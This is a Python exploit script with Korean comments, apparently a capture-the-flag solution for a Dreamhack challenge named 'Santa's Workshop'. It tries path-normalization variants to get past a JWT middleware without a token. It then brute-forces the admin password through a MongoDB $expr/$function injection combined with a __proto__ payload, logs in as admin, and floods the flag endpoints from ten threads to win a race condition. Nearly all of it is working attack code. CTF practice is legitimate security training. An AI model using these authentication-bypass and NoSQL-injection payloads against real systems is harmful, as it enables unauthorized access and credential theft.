import requests
import threading
import sys
import time

URL = "http://host3.dreamhack.games:8314"

def exploit():
    print("="*65)
    print(" 🎅 Santa's Workshop - Live Server Exploit 🎅")
    print("="*65)
    
    # ------------------------------------------------------------------
    # 0단계: 미들웨어 우회 경로 찾기 (Path Normalization Trick)
    # ------------------------------------------------------------------
    print("[*] 0단계: JWT 미들웨어를 토큰 없이 우회할 로그인 경로 탐색 중...")
    target_path = ""
    # NestJS/Express에서 자주 먹히는 경로 우회 패턴들
    test_paths = ["/user/login", "/user/login/", "//user/login", "/user/./login"]
    
    for path in test_paths:
        try:
            # 토큰 헤더 없이 순수하게 찔러봅니다.
            r = requests.post(f"{URL}{path}", data={"username": "test", "password": "test"})
            
            # 401(토큰 내놔) 에러가 안 뜨면 미들웨어를 무사히 뚫고 컨트롤러에 도달한 것입니다!
            if r.status_code != 401:
                target_path = path
                print(f"[+] 미들웨어 통과 뒷문 경로 발견!: {target_path}")
                break
        except requests.exceptions.RequestException:
            pass
            
    if not target_path:
        print("[-] 우회 경로를 찾지 못했습니다. 서버가 다운되었거나 닫혔을 수 있습니다.")
        sys.exit(1)

    # ------------------------------------------------------------------
    # 1단계: Admin PW Brute Force ($expr + $function)
    # ------------------------------------------------------------------
    print("\n[*] 1단계: 찾은 뒷문으로 관리자 비밀번호 추출 중... (약 1~2분 소요)")
    
    adminPW = ""
    hex_chars = "0123456789abcdef"
    
    for bf in range(32):
        found = False
        for i in hex_chars:
            print(f"[*] 브루트포스 진행 중 (Index: {bf:02d}) -> Trying: {adminPW}{i}", end='\r')
            
            raw_expr = f'{{"$function":{{"body":"function(pw) {{ return pw[{bf}] == \'{i}\' }}","args":["$password"],"lang":"js"}}}}'
            expr_clean = raw_expr.replace(' ', '').replace('returnpw', 'return pw')
            
            password_payload = f'testpw"}}, "$expr": {expr_clean}, "username": "admin'
            
            payload = {
                'username': 'admin", "__proto__": {"a":"haha',
                'password': password_payload
            }
            
            try:
                # 찾아낸 우회 경로(target_path)로 페이로드 전송 (헤더 없음)
                r = requests.post(f"{URL}{target_path}", data=payload)
                
                try:
                    status = r.json().get('statusCode', r.status_code)
                except:
                    status = r.status_code
                    
                if status == 403:
                    adminPW += i
                    found = True
                    print(f"\n[+] {bf}번째 글자 일치! 발견된 문자: '{i}' (현재까지 복구됨: {adminPW})")
                    break
                elif status not in [403, 404]:
                    print(f"\n[!] 서버가 예상치 못한 상태 코드({status})를 반환했습니다. 본문: {r.text}")
                    sys.exit(1)
                    
            except Exception as e:
                print(f"\n[-] Network Error: {e}")
                sys.exit(1)
                
        if not found:
            print(f"\n[*] 더 이상 일치하는 문자가 없습니다. Brute Force 종료.")
            break

    if not adminPW:
        print("[-] 관리자 비밀번호 추출에 실패했습니다.")
        return
        
    print(f"\n[+] 🎯 최종 추출된 Admin PW: {adminPW}")

    # ------------------------------------------------------------------
    # 2단계: 관리자 로그인 및 실제 토큰 획득
    # ------------------------------------------------------------------
    print("\n[*] 2단계: 획득한 PW로 관리자 로그인 시도...")
    r_login = requests.post(f"{URL}{target_path}", data={'username': 'admin', 'password': adminPW})
    
    try:
        admin_token = r_login.text.strip()
        print(f"[+] 로그인 성공! 관리자 진짜 토큰 획득: {admin_token[:40]}...")
    except Exception as e:
        print(f"[-] 로그인 실패: {r_login.text}")
        return
        
    admin_headers = {'Authorization': f'Bearer {admin_token}'}

    # ------------------------------------------------------------------
    # 3단계: 무한 Race Condition 공격
    # ------------------------------------------------------------------
    print("\n[*] 3단계: 무한 Race Condition 공격 시작!")
    print("[*] 10개의 스레드가 addFlag를 연사하고, 메인 스레드가 확인을 반복합니다.\n")
    
    is_solved = False
    
    def addflag():
        while not is_solved:
            try:
                requests.get(f'{URL}/admin/flag', headers=admin_headers)
            except:
                pass

    for i in range(10):
        t1 = threading.Thread(target=addflag)    
        t1.daemon = True
        t1.start()

    attempts = 0
    while not is_solved:
        attempts += 1
        print(f"[*] 레이스 컨디션 시도 중... ({attempts}회)", end="\r")
        
        try:
            requests.delete(f'{URL}/admin/flag', headers=admin_headers)
            check_res = requests.get(f'{URL}/admin/check', headers=admin_headers)
            
            if "DH{" in check_res.text:
                is_solved = True
                print("\n\n" + "="*50)
                print(" 🎉🎉🎉 RACE CONDITION SUCCESS! 🎉🎉🎉")
                print("="*50)
                print(f"\n🎯 최종 FLAG: {check_res.text}\n")
                break
            elif check_res.status_code != 404:
                if len(check_res.text) > 5 and "You don't have enough flags" not in check_res.text:
                    is_solved = True
                    print(f"\n[+] 수상한 응답 발견: {check_res.text}")
                    break
        except requests.exceptions.RequestException:
            pass

if __name__ == "__main__":
    exploit()